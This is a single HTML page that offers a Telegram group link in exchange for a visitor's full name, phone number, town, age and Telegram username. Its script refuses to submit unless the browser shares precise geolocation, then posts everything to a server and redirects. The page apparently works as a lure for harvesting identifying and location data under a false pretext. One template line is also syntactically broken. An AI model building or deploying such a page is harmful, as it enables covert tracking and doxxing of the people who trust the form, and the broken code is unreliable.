<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Join Telegram Group</title>
  <style>
    body {
      background: linear-gradient(to right, #2c3e50, #3498db);
      font-family: 'Segoe UI', sans-serif;
      color: white;
      text-align: center;
      padding: 50px;
    }
    input, button {
      padding: 10px;
      margin: 10px;
      width: 80%;
      max-width: 300px;
      border: none;
      border-radius: 5px;
    }
    input {
      background: #f0f0f0;
      color: #000;
    }
    button {
      background-color: #1abc9c;
      color: white;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    button:hover {
      background-color: #16a085;
    }
  </style>
</head>
<body>
  <h2>Fill the form to get the Telegram group link</h2>
  <form id="userForm">
    <input type="text" name="fullname" placeholder="Full Name" required><br>
    <input type="text" name="phone" placeholder="Phone Number" required><br>
    <input type="text" name="towncity" placeholder="Town/City" required><br>
    <input type="number" name="age" placeholder="Age" required><br>
    <input type="text" name="telegram" placeholder="Telegram Username" required><br>
    <button type="submit">Submit</button>
  </form>

  <script>
    document.getElementById("userForm").addEventListener("submit", function(e) {
      e.preventDefault();
      const form = e.target;

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          position => {
            const data = {
              fullname: form.fullname.value.trim(),
              phone: form.phone.value.trim(),
              towncity: form.towncity.value.trim(),
              age: form.age.value.trim(),
              telegram: form.telegram.value.trim(),
              location: Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}
            };
            submitData(data);
          },
          error => {
            document.body.innerHTML = "<h2 style='color:red; text-align:center;'>Failed to gain the trust</h2>";
          }
        );
      } else {
        document.body.innerHTML = "<h2 style='color:red; text-align:center;'>Failed to gain the trust</h2>";
      }

      function submitData(data) {
        fetch("/submit", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        })
        .then(res => res.json())
        .then(response => {
          if (response.link) {
            window.location.href = response.link;
          } else {
            alert(response.error || "Something went wrong.");
          }
        })
        .catch(err => {
          alert("Network error. Try again.");
          console.error(err);
        });
      }
    });
  </script>
</body>
</html>
